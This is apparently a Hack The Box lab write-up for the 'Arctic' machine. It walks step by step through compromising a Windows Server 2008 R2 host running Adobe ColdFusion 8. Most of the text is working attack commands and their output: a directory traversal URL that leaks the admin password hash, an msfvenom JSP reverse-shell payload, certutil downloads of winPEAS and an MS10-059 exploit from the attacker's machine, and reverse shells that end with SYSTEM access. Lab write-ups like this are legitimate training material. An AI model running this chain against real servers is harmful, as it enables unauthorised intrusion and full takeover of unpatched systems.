# recon
- windows server -> from pinging 127 TTL
- 3 open ports
  - 135/tcp   open  msrpc   Microsoft Windows RPC
  - 8500/tcp  open  fmtp?
  - 49154/tcp open  msrpc   Microsoft Windows RPC

let start by checking `http://arctic.htb:8500/` there are 2 dicrectory
```
CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ
```
- CFIDE/
```
Application.cfm                                       1151   03/18/08 11:06 πμ
adminapi/                                              dir   03/22/17 08:53 μμ
administrator/                                         dir   03/22/17 08:55 μμ
classes/                                               dir   03/22/17 08:52 μμ
componentutils/                                        dir   03/22/17 08:52 μμ
debug/                                                 dir   03/22/17 08:52 μμ
images/                                                dir   03/22/17 08:52 μμ
install.cfm                                          12077   03/18/08 11:06 πμ
multiservermonitor-access-policy.xml                   278   03/18/08 11:07 πμ
probe.cfm                                            30778   03/18/08 11:06 πμ
scripts/                                               dir   03/22/17 08:52 μμ
wizards/
```
`CFIDE/administrator/` looks juicy! the link lead us to **ColdFusion Administrator Login**. It is a Adobe ColdFusion 8. I tried to poke the login page a bit, seem like the passwrod is encrypt before it is send to the server. 

after some diging I found this two link:
1. https://www.exploit-db.com/exploits/14641
2. https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

so let exploit it and grab password by visit this page!!
`CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en` 
```
#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true
```
now use `crackstation` to crack the password -> admin:happyday and log into the admin page. Base on the link 2nd link i mentioned before, we can upload our shell in a **scheduled task** that would download cfexec.cfm to the server's webroot.


let prepare the reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<kali ip> LPORT=6969 -f raw > shell.jsp
```
run python http.server + nc and wait for incoming shell.


so now go to debugging and logging -> scheduled task -> add new task. Follow the figure the and give the similar input as the POC. Now visite /log.jsp to get shell.
```
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```
- systeminfo
```
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          5/10/2020, 12:30:54 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 111 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 958 MB
Virtual Memory: In Use:    1.089 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

Base on the hotfix. the victim server never been patch before so we can just google about any exploit for `Microsoft Windows Server 2008 R2` or using `winPEAS`

let get winPEAS to the victim server by using `certutil` command
```
certutil -urlcache -f "http://<kali ip>:8888/winPEAS.bat" winPEAS.bat
```
run it
```
"Microsoft Windows Server 2008 R2 Standard " 
[i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
MS11-080 patch is NOT installed! (Vulns: XP/SP3,2K3/SP3-afd.sys)
MS16-032 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
MS11-011 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
MS10-59 patch is NOT installed! (Vulns: 2K8,Vista,7/SP0-Chimichurri)
```
after diggin around I found the expolit for Chimichurri or MS10-059 on [github](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)
dowload on kali and get it on our victim server.
```
certutil -urlcache -f "http://<kali ip>:8888/MS10-059.exe" ms10059.exe
```
now let exploit it!!
```
C:\Users\tolis\Desktop>certutil -urlcache -f "http://<kali ip>:8888/MS10-059.exe" ms10059.exe
certutil -urlcache -f "http://<kali ip>:8888/MS10-059.exe" ms10059.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\tolis\Desktop

05/10/2020  03:15 ��    <DIR>          .
05/10/2020  03:15 ��    <DIR>          ..
05/10/2020  03:17 ��           784.384 ms10059.exe
22/03/2017  10:01 ��                32 user.txt
05/10/2020  03:09 ��            33.057 winPEAS.bat
05/10/2020  03:07 ��           472.064 winPEAS.exe
               4 File(s)      1.289.537 bytes
               2 Dir(s)  33.174.990.848 bytes free

C:\Users\tolis\Desktop>ms10059.exe
ms10059.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
C:\Users\tolis\Desktop>ms10059.exe <kali ip> 9696
ms10059.exe <kali ip> 9696
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\Users\tolis\Desktop>
```
on our another terminal that we ran `nc`
```
kali@kali:~/HTB/arctic$ nc -nlvp 9696
listening on [any] 9696 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49875
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Desktop>whoami
whoami
nt authority\system
```
go grab ur flag. GLHF